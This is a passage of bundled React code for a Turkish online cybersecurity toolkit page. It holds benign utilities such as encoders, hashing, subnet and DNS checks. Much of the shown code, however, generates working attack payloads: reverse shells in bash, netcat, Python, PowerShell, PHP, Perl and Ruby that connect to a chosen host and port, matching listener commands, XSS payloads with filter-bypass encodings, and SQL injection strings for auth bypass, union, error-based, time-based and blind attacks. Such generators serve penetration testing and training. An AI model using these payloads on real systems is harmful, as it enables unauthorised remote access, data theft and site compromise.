    return formatted;
  };
  var ToolsPage = ({ navigate, data }) => {
    const slug = data ? data.slug : null;
    const [copied, setCopied] = useState("");
    const handleCopy = (text, key) => {
      navigator.clipboard.writeText(text);
      setCopied(key);
      setTimeout(() => setCopied(""), 2e3);
    };
    const toolsList = [
      { slug: "reverse-shell", name: "Reverse Shell Olu\u015Fturucu", desc: "IP ve port bilgilerini girerek Bash, Python, PHP ve PowerShell reverse shell komutlar\u0131n\u0131 saniyeler i\xE7inde olu\u015Fturun.", icon: "\u{1F50C}" },
      { slug: "encoder-decoder", name: "Cyber Encoder/Decoder", desc: "Base64, Hex, Binary, URL ve HTML formatlar\u0131nda metin \u015Fifreleme ve kod \xE7\xF6zme i\u015Flemlerini ger\xE7ekle\u015Ftirin.", icon: "\u{1F510}" },
      { slug: "password-strength", name: "Parola Entropi & G\xFCvenlik", desc: "\u015Eifrenizin brute force (kaba kuvvet) k\u0131r\u0131lma s\xFCresini hesaplay\u0131n ve kriptografik g\xFCvenli parolalar \xFCretin.", icon: "\u{1F511}" },
      { slug: "subnet-calc", name: "CIDR & Subnet Hesaplay\u0131c\u0131", desc: "IP adresinizi ve alt a\u011F maskesini (CIDR) girerek alt a\u011F aral\u0131\u011F\u0131n\u0131, a\u011F adresini, yay\u0131m adresini ve binary kar\u015F\u0131l\u0131\u011F\u0131n\u0131 analiz edin.", icon: "\u{1F310}" },
      { slug: "hash-tool", name: "Hash Olu\u015Fturucu & Tan\u0131mlay\u0131c\u0131", desc: "Verilerinizin MD5, SHA-1, SHA-256 ve SHA-512 hash \xE7\u0131kt\u0131lar\u0131n\u0131 \xFCretin ve bilinmeyen hash tiplerini otomatik tan\u0131mlay\u0131n.", icon: "\u{1F9EE}" },
      { slug: "xss-generator", name: "XSS Payload Olu\u015Fturucu", desc: "HTML, SVG, Attribute ve filtre atlatma (WAF bypass) XSS sald\u0131r\u0131 kodlar\u0131n\u0131 dinamik olarak \xFCretin.", icon: "\u{1F9EA}" },
      { slug: "sqli-generator", name: "SQL Injection Jenerat\xF6r\xFC", desc: "DBMS t\xFCr\xFCne g\xF6re Union, Boolean, Time ve Auth bypass SQL Injection \u015Fablonlar\u0131n\u0131 parametrik olarak olu\u015Fturun.", icon: "\u{1F489}" },
      { slug: "cron-explainer", name: "Cron Zamanlay\u0131c\u0131 & A\xE7\u0131klay\u0131c\u0131", desc: "Cron zaman ifadelerini T\xFCrk\xE7e do\u011Fal dilde analiz edin veya g\xF6rsel kontrollerle s\u0131f\u0131rdan cron ifadesi olu\u015Fturun.", icon: "\u23F0" },
      { slug: "base64-file", name: "Base64 Dosya D\xF6n\xFC\u015Ft\xFCr\xFCc\xFC", desc: "G\xF6rselleri ve dosyalar\u0131 taray\u0131c\u0131da yerel olarak (sunucuya g\xF6ndermeden) Base64 veri koduna d\xF6n\xFC\u015Ft\xFCr\xFCn.", icon: "\u{1F4C1}" },
      { slug: "dns-lookup", name: "DNS & SPF DMARC Analiz\xF6r\xFC", desc: "Cloudflare DoH \xFCzerinden alan adlar\u0131n\u0131n A, MX, TXT, SPF ve DMARC kay\u0131tlar\u0131n\u0131 sorgulay\u0131n ve e-posta g\xFCvenlik risklerini raporlay\u0131n.", icon: "\u{1F4E1}" }
    ];
    const activeTool = toolsList.find((t) => t.slug === slug);
    const [rsIp, setRsIp] = useState("10.10.10.10");
    const [rsPort, setRsPort] = useState("4444");
    const [rsShell, setRsShell] = useState("bash");
    const [rsListener, setRsListener] = useState("nc");
    const randomRsPort = () => {
      const port = Math.floor(Math.random() * (65535 - 1024 + 1)) + 1024;
      setRsPort(port.toString());
    };
    const getShellPayload = () => {
      const ip = rsIp.trim() || "10.10.10.10";
      const port = rsPort.trim() || "4444";
      switch (rsShell) {
        case "bash":
          return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        case "bash-readline":
          return `exec 5<>/dev/tcp/${ip}/${port};cat <&5 | while read line; do $line 2>&5 >&5; done`;
        case "nc":
          return `nc -e /bin/bash ${ip} ${port}`;
        case "nc-openbsd":
          return `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
        case "python":
          return `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`;
        case "powershell":
          return `$L='${ip}';$P=${port};$C=New-Object System.Net.Sockets.TCPClient($L,$P);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($B,0,$I);$R=(iex $D 2>&1 | Out-String );$R2=$R + "PS " + (pwd).Path + "> ";$SB=([text.encoding]::ASCII).GetBytes($R2);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()`;
        case "php":
          return `php -r '$sock=fsockopen("${ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
        case "perl":
          return `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
        case "ruby":
          return `ruby -rsocket -e'f=TCPSocket.open("${ip}",{port}).to_i;exec(sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f))'`;
        default:
          return "";
      }
    };
    const getListenerPayload = () => {
      const port = rsPort.trim() || "4444";
      switch (rsListener) {
        case "nc":
          return `nc -lvnp ${port}`;
        case "ncat":
          return `ncat -lvnp ${port}`;
        case "rlwrap":
          return `rlwrap nc -lvnp ${port}`;
        case "socat":
          return `socat file:\`tty\`,raw,echo=0 tcp-listen:${port}`;
        case "powershell":
          return `PowerShell -NoP -Command "$S=New-Object System.Net.Sockets.TcpListener(${port});$S.Start();$C=$S.AcceptTcpClient();$St=$C.GetStream();$R=New-Object System.IO.StreamReader($St);$W=New-Object System.IO.StreamWriter($St);$W.AutoFlush=$true;while($C.Connected){$cmd=$R.ReadLine();if($cmd -eq 'exit'){$C.Close();break};try{$out=Invoke-Expression $cmd 2>&1 | Out-String}catch{$out=$_.Exception.Message};$W.WriteLine($out)}"`;
        default:
          return "";
      }
    };
    const [encText, setEncText] = useState("");
    const [encFormat, setEncFormat] = useState("base64");
    const [encMode, setEncMode] = useState("encode");
    const [encResult, setEncResult] = useState("");
    useEffect(() => {
      if (encMode === "encode") {
        setEncResult(handleEncode(encText, encFormat));
      } else {
        setEncResult(handleDecode(encText, encFormat));
      }
    }, [encText, encFormat, encMode]);
    const swapEncoder = () => {
      setEncText(encResult);
      setEncMode((m) => m === "encode" ? "decode" : "encode");
    };
    const [passInput, setPassInput] = useState("");
    const [showPass, setShowPass] = useState(false);
    const [genLen, setGenLen] = useState(16);
    const [genLower, setGenLower] = useState(true);
    const [genUpper, setGenUpper] = useState(true);
    const [genNum, setGenNum] = useState(true);
    const [genSym, setGenSym] = useState(true);
    const [genResult, setGenResult] = useState("");
    const passAnalysis = analyzePassword(passInput);
    const handleGeneratePass = () => {
      const newPass = generatePassword(genLen, genLower, genUpper, genNum, genSym);
      setGenResult(newPass);
    };
    const [subnetIp, setSubnetIp] = useState("192.168.1.1");
    const [subnetCidr, setSubnetCidr] = useState(24);
    const subnetResult = calculateSubnet(subnetIp, subnetCidr);
    const [hashInput, setHashInput] = useState("");
    const [hMd5, setHMd5] = useState("");
    const [hSha1, setHSha1] = useState("");
    const [hSha256, setHSha256] = useState("");
    const [hSha512, setHSha512] = useState("");
    const [detectInput, setDetectInput] = useState("");
    useEffect(() => {
      if (!hashInput) {
        setHMd5("");
        setHSha1("");
        setHSha256("");
        setHSha512("");
        return;
      }
      setHMd5(md5(hashInput));
      getShaHash("SHA-1", hashInput).then(setHSha1);
      getShaHash("SHA-256", hashInput).then(setHSha256);
      getShaHash("SHA-512", hashInput).then(setHSha512);
    }, [hashInput]);
    const detectedHashes = detectHashType(detectInput);
    const [xssPayloadType, setXssPayloadType] = useState("html");
    const [xssCustomParam, setXssCustomParam] = useState("alert(document.domain)");
    const [xssFilterBypass, setXssFilterBypass] = useState("none");
    const getXssPayload = () => {
      const custom = xssCustomParam.trim() || "alert(document.domain)";
      let p = "";
      switch (xssPayloadType) {
        case "html":
          p = `<script>${custom}<\/script>`;
          break;
        case "img":
          p = `<img src="x" onerror="${custom}">`;
          break;
        case "svg":
          p = `<svg onload="${custom}">`;
          break;
        case "body":
          p = `<body onload="${custom}">`;
          break;
        case "iframe":
          p = `<iframe src="javascript:${custom}">`;
          break;
        case "attribute":
          p = `" onmouseover="${custom}" x="`;
          break;
        case "javascript-context":
          p = `'-${custom}-'`;
          break;
        case "polyglot":
          p = 'jaVasCript:/*-/*\\\\`/*\\\\"\\`/*\'/*"/**/(/* */' + custom + '/*\\\\`/*\\\\`/*"/*/*/';
          break;
        default:
          p = "";
      }
      if (xssFilterBypass === "html-entity") {
        return p.split("").map((c) => `&#${c.charCodeAt(0)};`).join("");
      } else if (xssFilterBypass === "string-fromcharcode") {
        const cc = custom.split("").map((c) => c.charCodeAt(0)).join(",");
        const wrapped = `eval(String.fromCharCode(${cc}))`;
        if (xssPayloadType === "html") return `<script>${wrapped}<\/script>`;
        if (xssPayloadType === "img") return `<img src="x" onerror="${wrapped}">`;
        if (xssPayloadType === "svg") return `<svg onload="${wrapped}">`;
        if (xssPayloadType === "body") return `<body onload="${wrapped}">`;
        if (xssPayloadType === "iframe") return `<iframe src="javascript:${wrapped}">`;
        if (xssPayloadType === "attribute") return `" onmouseover="${wrapped}" x="`;
        if (xssPayloadType === "javascript-context") return `'-${wrapped}-'`;
        return wrapped;
      } else if (xssFilterBypass === "url") {
        return encodeURIComponent(p);
      }
      return p;
    };
    const [sqliDbms, setSqliDbms] = useState("mysql");
    const [sqliType, setSqliType] = useState("auth");
    const [sqliCols, setSqliCols] = useState(5);
    const [sqliTable, setSqliTable] = useState("users");
    const [sqliDbName, setSqliDbName] = useState("database()");
    const getSqliPayload = () => {
      const colVal = parseInt(sqliCols) || 5;
      let p = "";
      switch (sqliType) {
        case "auth":
          if (sqliDbms === "mysql" || sqliDbms === "postgresql") p = `' OR 1=1 -- -`;
          else if (sqliDbms === "mssql") p = `' OR 1=1 --`;
          else p = `' OR 1=1;`;
          break;
        case "union":
          const columnsArray = Array.from({ length: colVal }).map((_, i) => {
            if (i === 1) return sqliDbName || "database()";
            return i + 1;
          });
          if (sqliDbms === "mysql") p = `' UNION SELECT ${columnsArray.join(",")} -- -`;
          else if (sqliDbms === "postgresql" || sqliDbms === "mssql") p = `' UNION SELECT ${columnsArray.map((c) => typeof c === "string" ? c : "NULL").join(",")} --`;
          else p = `' UNION SELECT ${columnsArray.join(",")} FROM dual --`;
          break;
        case "error":
          if (sqliDbms === "mysql") p = `' AND extractvalue(1, concat(0x3a, ${sqliDbName || "database()"})) -- -`;
          else if (sqliDbms === "postgresql") p = `' AND CAST((SELECT ${sqliDbName || "database()"}) AS NUMERIC) --`;
          else if (sqliDbms === "mssql") p = `' AND 1=Convert(int, (SELECT ${sqliDbName || "database()"})) --`;
          else p = `' AND utl_inaddr.get_host_address((SELECT ${sqliDbName || "database()"})) --`;
          break;
        case "time":
          if (sqliDbms === "mysql") p = `' AND SLEEP(5) -- -`;
          else if (sqliDbms === "postgresql") p = `' AND pg_sleep(5) --`;
          else if (sqliDbms === "mssql") p = `' AND WAITFOR DELAY '0:0:5' --`;
          else p = `' AND DBMS_PIPE.RECEIVE_MESSAGE('a', 5) --`;
          break;
        case "blind":
          if (sqliDbms === "mysql") p = `' AND ascii(substring((${sqliDbName || "database()"}),1,1)) > 64 -- -`;
          else p = `' AND ascii(substr((${sqliDbName || "database()"}),1,1)) > 64 --`;
          break;
        default:
          p = "";
      }
      return p;
    };
    const [cronMin, setCronMin] = useState("*");
    const [cronHour, setCronHour] = useState("*");
    const [cronDay, setCronDay] = useState("*");
    const [cronMonth, setCronMonth] = useState("*");
    const [cronDow, setCronDow] = useState("*");
    const [cronManualInput, setCronManualInput] = useState("* * * * *");
    const [cronInputMode, setCronInputMode] = useState("interactive");
    useEffect(() => {
      if (cronInputMode === "interactive") {
        setCronManualInput(`${cronMin} ${cronHour} ${cronDay} ${cronMonth} ${cronDow}`);
      }
    }, [cronMin, cronHour, cronDay, cronMonth, cronDow, cronInputMode]);
    const explainCron = (expr) => {
      const parts = expr.trim().split(/\s+/);
      if (parts.length < 5) return "Ge\xE7ersiz cron ifadesi. En az 5 s\xFCtun olmal\u0131 (Dakika, Saat, G\xFCn, Ay, Haftan\u0131n G\xFCn\xFC).";
      const [min, hour, day, month, dow] = parts;
      const explainField = (val, type) => {
        if (val === "*") return type === "min" ? "her dakika" : type === "hour" ? "her saat" : type === "day" ? "her g\xFCn" : type === "month" ? "her ay" : "haftan\u0131n her g\xFCn\xFC";
        if (val.includes("/")) {
          const [start, step] = val.split("/");
          return `${step} bir ${type === "min" ? "dakikada" : type === "hour" ? "saatte" : type === "day" ? "g\xFCnde" : type === "month" ? "ayda" : "g\xFCnde"}`;
        }
        if (val.includes(",")) {
          return `\u015Fu zamanlarda: ${val}`;
        }
        if (val.includes("-")) {
          return `${val.replace("-", " ile ")} aras\u0131`;
        }
        if (type === "dow") {
          const days = ["Pazar", "Pazartesi", "Sal\u0131", "\xC7ar\u015Famba", "Per\u015Fembe", "Cuma", "Cumartesi", "Pazar"];
          return days[parseInt(val)] || val;
        }
        if (type === "month") {
          const months = ["", "Ocak", "\u015Eubat", "Mart", "Nisan", "May\u0131s", "Haziran", "Temmuz", "A\u011Fustos", "Eyl\xFCl", "Ekim", "Kas\u0131m", "Aral\u0131k"];
          return months[parseInt(val)] || val;
        }
        return `${val}. ${type === "min" ? "dakika" : type === "hour" ? "saat" : type === "day" ? "g\xFCn" : "ay"}`;
      };
      return `Her ${explainField(month, "month")}, ay\u0131n ${explainField(day, "day")} g\xFCn\xFC ve ${explainField(dow, "dow")} g\xFCnlerinde; saat ${explainField(hour, "hour")}, ${explainField(min, "min")} zaman\u0131nda \xE7al\u0131\u015F\u0131r.`;
    };
    const [b64FileName, setB64FileName] = useState("");
    const [b64FileSize, setB64FileSize] = useState(0);
    const [b64FileType, setB64FileType] = useState("");
    const [b64Encoded, setB64Encoded] = useState("");
    const [b64DecodeText, setB64DecodeText] = useState("");
    const [b64ToolMode, setB64ToolMode] = useState("encode");
    const handleFileSelect = (e) => {
      const file = e.target.files[0];
      if (!file) return;
      setB64FileName(file.name);
      setB64FileSize(file.size);
      setB64FileType(file.type);
      const reader = new FileReader();
      reader.onload = (event) => {
        setB64Encoded(event.target.result);
      };
      reader.readAsDataURL(file);
    };
    const handleBase64Decode = () => {
      try {
        const raw = b64DecodeText.trim().replace(/^data:.*?;base64,/, "");
        const bytes = atob(raw);
        const len = bytes.length;
        const arr = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
          arr[i] = bytes.charCodeAt(i);
        }
        const blob = new Blob([arr], { type: "application/octet-stream" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = "cozulen_dosya.bin";
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      } catch (err) {
        alert("Hata: Ge\xE7ersiz Base64 format\u0131!");
      }
    };
    const [dnsDomain, setDnsDomain] = useState("siberkampus.com");
    const [dnsLoading, setDnsLoading] = useState(false);
    const [dnsResults, setDnsResults] = useState(null);
    const runDnsQuery = async () => {
      const dom = dnsDomain.trim().toLowerCase();
      if (!dom) return;
      setDnsLoading(true);
      setDnsResults(null);
      try {
        const fetchRecord = async (type, nameTarget = dom) => {
          const res = await fetch(`https://cloudflare-dns.com/dns-query?name=${nameTarget}&type=${type}`, {
            headers: { "Accept": "application/dns-json" }
          });
          const data2 = await res.json();
          return data2.Answer || [];
        };
        const [aRecs, mxRecs, txtRecs, dmarcRecs] = await Promise.all([
          fetchRecord("A"),
          fetchRecord("MX"),
          fetchRecord("TXT"),
          fetchRecord("TXT", `_dmarc.${dom}`)
        ]);
        const spf = txtRecs.find((r) => r.data.includes("v=spf1")) || null;
        const dmarc = dmarcRecs.find((r) => r.data.includes("v=DMARC1")) || null;
        const risks = [];
        if (!spf) {
          risks.push({
            status: "TEHL\u0130KEL\u0130",
            color: "text-red-400 border-red-500/20 bg-red-500/5",
            title: "SPF Kayd\u0131 Eksik",
            desc: "Bu alan ad\u0131 ad\u0131na ba\u015Fkalar\u0131n\u0131n sahte mail g\xF6ndermesini (mail spoofing) engelleyecek SPF kayd\u0131 bulunamad\u0131!"
          });
        } else {
          risks.push({
            status: "G\xDCVENL\u0130",
            color: "text-emerald-400 border-emerald-500/20 bg-emerald-500/5",
            title: "SPF Kayd\u0131 Aktif",
            desc: `Mail sunucu izni tan\u0131ml\u0131: ${spf.data}`
          });
        }
        if (!dmarc) {
          risks.push({
            status: "R\u0130SKL\u0130",
            color: "text-yellow-400 border-yellow-500/20 bg-yellow-500/5",
            title: "DMARC Politikas\u0131 Eksik",
            desc: "SPF/DKIM kontrolleri ba\u015Far\u0131s\u0131z oldu\u011Funda al\u0131c\u0131 sunucunun ne yapaca\u011F\u0131n\u0131 belirten DMARC kayd\u0131 bulunamad\u0131."
          });
        } else {
          risks.push({
            status: "G\xDCVENL\u0130",
            color: "text-emerald-400 border-emerald-500/20 bg-emerald-500/5",
            title: "DMARC Politikas\u0131 Aktif",
            desc: `Uygulanan kural: ${dmarc.data}`
          });
        }
        setDnsResults({ a: aRecs, mx: mxRecs, txt: txtRecs, spf, dmarc, risks });
      } catch (e) {
        alert("DNS sorgulan\u0131rken hata olu\u015Ftu.");
      } finally {
        setDnsLoading(false);
      }
    };
    return /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement(Header, { navigate }), !slug ? /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement("section", { className: "relative overflow-hidden border-b border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "absolute top-[-20%] left-1/2 -translate-x-1/2 w-[820px] h-[440px] z-0 pointer-events-none", style: { background: "radial-gradient(ellipse at center,rgba(0,255,136,.13),transparent 62%)" } }), /* @__PURE__ */ React.createElement("div", { className: "max-w-[860px] mx-auto px-8 relative z-[2] text-center py-20" }, /* @__PURE__ */ React.createElement("span", { className: "font-mono text-[12px] font-medium tracking-[.18em] uppercase text-[#00ff88] inline-flex items-center gap-2.5 mb-4" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#5c8a74] font-bold" }, "//"), " Geli\u015Fmi\u015F G\xFCvenlik Kitleri"), /* @__PURE__ */ React.createElement("h1", { className: "text-[clamp(34px,5vw,52px)] text-[#eafff5] mb-5 font-disp font-bold" }, "Online Siber G\xFCvenlik ", /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88]" }, "Ara\xE7lar\u0131")), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-base leading-relaxed max-w-[640px] mx-auto" }, "Tamamen taray\u0131c\u0131n\u0131zda \xE7al\u0131\u015Fan, 100% istemci tarafl\u0131 (client-side) \xE7al\u0131\u015Fan, SEO dostu ve T\xFCrk\xE7e siber g\xFCvenlik ara\xE7 kiti. Bilgileriniz asla sunucular\u0131m\u0131za g\xF6nderilmez."))), /* @__PURE__ */ React.createElement("section", { className: "py-16" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[1080px] mx-auto px-8" }, /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6" }, toolsList.map((tool) => /* @__PURE__ */ React.createElement("div", { key: tool.slug, className: "rounded-2xl border border-[#0c2719] bg-[rgba(4,16,10,.85)] p-6 hover:border-[#00ff88] transition-all flex flex-col justify-between group" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("div", { className: "text-3xl mb-4 p-3 rounded-lg border border-[#103a26] bg-[rgba(0,255,136,.04)] inline-block" }, tool.icon), /* @__PURE__ */ React.createElement("h3", { className: "text-xl font-bold text-[#eafff5] group-hover:text-[#00ff88] transition-colors mb-2" }, tool.name), /* @__PURE__ */ React.createElement("p", { className: "text-sm text-[#74998a] leading-relaxed mb-6" }, tool.desc)), /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("tools", { slug: tool.slug }), className: "w-full text-center py-3 font-mono text-sm font-bold text-[#021008] bg-[#00ff88] rounded-lg hover:shadow-[0_0_20px_-4px_var(--glow)] transition-all" }, "Arac\u0131 \xC7al\u0131\u015Ft\u0131r \u2192"))))))) : (
      /* Inside a tool view */
      /* @__PURE__ */ React.createElement("section", { className: "py-10 border-b border-[#0c2719]" }, /* @__PURE__ */ React.createElement("div", { className: "max-w-[1280px] mx-auto px-6" }, /* @__PURE__ */ React.createElement("div", { className: "flex items-center gap-2 text-xs text-[#74998a] mb-6" }, /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("home"), className: "hover:text-[#00ff88] transition-colors" }, "Anasayfa"), /* @__PURE__ */ React.createElement("span", null, "/"), /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("tools"), className: "hover:text-[#00ff88] transition-colors" }, "G\xFCvenlik Ara\xE7lar\u0131"), /* @__PURE__ */ React.createElement("span", null, "/"), /* @__PURE__ */ React.createElement("span", { className: "text-[#eafff5]" }, activeTool ? activeTool.name : "")), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 lg:grid-cols-[280px_1fr] gap-8" }, /* @__PURE__ */ React.createElement("div", { className: "space-y-2" }, /* @__PURE__ */ React.createElement("div", { className: "hidden lg:block font-mono text-xs uppercase text-[#5c8a74] font-medium tracking-[.12em] mb-4" }, "Ara\xE7 K\xFCt\xFCphanesi"), /* @__PURE__ */ React.createElement("div", { className: "flex flex-row lg:flex-col overflow-x-auto lg:overflow-x-visible gap-2 pb-3 lg:pb-0 border-b border-[#0c2719] lg:border-b-0" }, toolsList.map((t) => /* @__PURE__ */ React.createElement("button", { key: t.slug, onClick: () => navigate("tools", { slug: t.slug }), className: `flex items-center gap-3 px-4 py-3 rounded-lg text-left text-sm font-mono transition-all flex-shrink-0 lg:flex-shrink-1 ${t.slug === slug ? "text-[#00ff88] bg-[rgba(0,255,136,.06)] border border-[#103a26]" : "text-[#74998a] hover:text-[#cdeede] hover:bg-white/5 border border-transparent"}` }, /* @__PURE__ */ React.createElement("span", null, t.icon), /* @__PURE__ */ React.createElement("span", { className: "truncate" }, t.name)))), /* @__PURE__ */ React.createElement("button", { onClick: () => navigate("tools"), className: "hidden lg:flex items-center justify-center gap-2 w-full mt-6 py-2.5 border border-[#103a26] text-xs font-mono text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88] transition-colors rounded-lg" }, "\u2190 T\xFCm Ara\xE7lara D\xF6n")), /* @__PURE__ */ React.createElement("div", { className: "rounded-2xl border border-[#103a26] bg-[rgba(4,16,10,.85)] p-6 md:p-8 min-h-[500px]" }, slug === "reverse-shell" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u{1F50C} Reverse Shell Olu\u015Fturucu"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Hedef makinede \xE7al\u0131\u015Ft\u0131r\u0131lmak \xFCzere dinamik ve etkile\u015Fimli reverse shell komut \u015Fablonlar\u0131 \xFCretin."), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4 mb-6" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Hedef/Lokal IP Adresi (LHOST)"), /* @__PURE__ */ React.createElement("input", { value: rsIp, onChange: (e) => setRsIp(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "10.10.10.10" })), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Dinleyici Portu (LPORT)"), /* @__PURE__ */ React.createElement("div", { className: "flex gap-2" }, /* @__PURE__ */ React.createElement("input", { value: rsPort, onChange: (e) => setRsPort(e.target.value), type: "number", className: "flex-1 bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "4444", min: "1", max: "65535" }), /* @__PURE__ */ React.createElement("button", { onClick: randomRsPort, className: "px-3 border border-[#103a26] text-[#74998a] hover:text-[#00ff88] hover:border-[#00ff88] font-mono text-xs transition-colors rounded-lg" }, "Port \xDCret")))), /* @__PURE__ */ React.createElement("div", { className: "mb-4" }, /* @__PURE__ */ React.createElement("label", { className: "block text-xs font-mono uppercase text-[#5c8a74] mb-2" }, "Shell payload tipi"), /* @__PURE__ */ React.createElement("div", { className: "flex flex-wrap gap-2" }, [
        { id: "bash", label: "Bash" },
        { id: "bash-readline", label: "Bash Readline" },
        { id: "nc", label: "Netcat" },
        { id: "nc-openbsd", label: "Netcat (OpenBSD)" },
        { id: "python", label: "Python" },
        { id: "powershell", label: "PowerShell" },
        { id: "php", label: "PHP" },
        { id: "perl", label: "Perl" },
        { id: "ruby", label: "Ruby" }
      ].map((s) => /* @__PURE__ */ React.createElement("button", { key: s.id, onClick: () => setRsShell(s.id), className: `px-3 py-1.5 rounded border text-xs font-mono transition-colors ${rsShell === s.id ? "bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]" : "border-[#103a26] text-[#74998a] hover:text-[#cdeede]"}` }, s.label)))), /* @__PURE__ */ React.createElement("div", { className: "relative mb-8" }, /* @__PURE__ */ React.createElement("div", { className: "absolute right-3 top-3 flex items-center gap-2" }, /* @__PURE__ */ React.createElement("button", { onClick: () => handleCopy(getShellPayload(), "payload"), className: "px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors" }, copied === "payload" ? "\u2713 Kopyaland\u0131!" : "\u{1F4CB} Kopyala")), /* @__PURE__ */ React.createElement("pre", { className: "bg-[#020806] border border-[#103a26] rounded-xl p-5 pt-12 overflow-x-auto text-sm text-[#eafff5] font-mono whitespace-pre-wrap break-all min-h-[80px]" }, getShellPayload())), /* @__PURE__ */ React.createElement("div", { className: "border-t border-[#0c2719] pt-6" }, /* @__PURE__ */ React.createElement("h3", { className: "text-lg font-bold text-[#eafff5] mb-2" }, "\u{1F4E5} Dinleyici (Listener) Komutu"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-xs mb-4" }, "Reverse shell ba\u011Flant\u0131s\u0131n\u0131 kar\u015F\u0131lamak i\xE7in lokal makinenizde \xE7al\u0131\u015Ft\u0131r\u0131n."), /* @__PURE__ */ React.createElement("div", { className: "flex gap-2 mb-4" }, [
        { id: "nc", label: "nc (Netcat)" },
        { id: "rlwrap", label: "rlwrap nc" },
        { id: "ncat", label: "ncat" },
        { id: "socat", label: "socat" },
        { id: "powershell", label: "PowerShell" }
      ].map((l) => /* @__PURE__ */ React.createElement("button", { key: l.id, onClick: () => setRsListener(l.id), className: `px-2.5 py-1.5 rounded border text-xs font-mono transition-all ${rsListener === l.id ? "bg-[rgba(0,255,136,.06)] border-[#00ff88] text-[#00ff88]" : "border-[#103a26] text-[#74998a] hover:text-[#cdeede]"}` }, l.label))), /* @__PURE__ */ React.createElement("div", { className: "relative mb-6" }, /* @__PURE__ */ React.createElement("div", { className: "absolute right-3 top-3" }, /* @__PURE__ */ React.createElement("button", { onClick: () => handleCopy(getListenerPayload(), "listener"), className: "px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors" }, copied === "listener" ? "\u2713 Kopyaland\u0131!" : "\u{1F4CB} Kopyala")), /* @__PURE__ */ React.createElement("pre", { className: "bg-[#020806] border border-[#103a26] rounded-xl p-5 pt-12 overflow-x-auto text-sm text-[#eafff5] font-mono whitespace-pre-wrap break-all" }, getListenerPayload())), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#103a26] p-4 bg-[rgba(0,255,136,.02)] text-xs text-[#74998a] space-y-2 leading-relaxed" }, /* @__PURE__ */ React.createElement("div", { className: "font-bold text-[#00ff88]" }, "\u{1F4A1} TTY Y\xFCkseltme \u0130pucu:"), /* @__PURE__ */ React.createElement("div", null, "Ba\u011Flant\u0131 geldikten sonra tam etkile\u015Fimli (tab tamamlama, y\xF6n tu\u015Flar\u0131, vb.) bir kabuk elde etmek i\xE7in:"), /* @__PURE__ */ React.createElement("code", { className: "block bg-black/40 p-2 rounded border border-[#103a26] text-[#eafff5] font-mono mt-1" }, `python3 -c 'import pty; pty.spawn("/bin/bash")'`), /* @__PURE__ */ React.createElement("div", null, "Ard\u0131ndan s\u0131ras\u0131yla: ", /* @__PURE__ */ React.createElement("code", { className: "text-[#00ff88]" }, "Ctrl+Z"), " tu\u015Flay\u0131p ba\u011Flant\u0131y\u0131 arka plana at\u0131n, ard\u0131ndan terminalinize ", /* @__PURE__ */ React.createElement("code", { className: "text-[#eafff5]" }, "stty raw -echo; fg"), " komutunu girip enter tu\u015Flay\u0131n.")))), slug === "encoder-decoder" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u{1F510} Ak\u0131ll\u0131 Cyber Encoder/Decoder"), 